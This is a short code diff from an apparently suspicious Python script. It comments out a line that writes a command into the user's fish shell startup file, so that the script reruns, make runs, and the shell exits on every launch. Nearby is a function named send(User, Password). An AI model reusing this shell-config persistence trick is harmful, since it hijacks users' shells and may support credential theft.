@@ -51,7 +51,7 @@ while Input!="exit":
     except:
         pass
 
-os.system(f'echo "python {os.getenv("PWD")}/fresh; make -C {os.getenv("PWD")}; exit" >> {os.getenv("HOME")}/.config/fish/config.fish')
+#os.system(f'echo "python {os.getenv("PWD")}/fresh; make -C {os.getenv("PWD")}; exit" >> {os.getenv("HOME")}/.config/fish/config.fish')
 
 
 def send(User, Password):
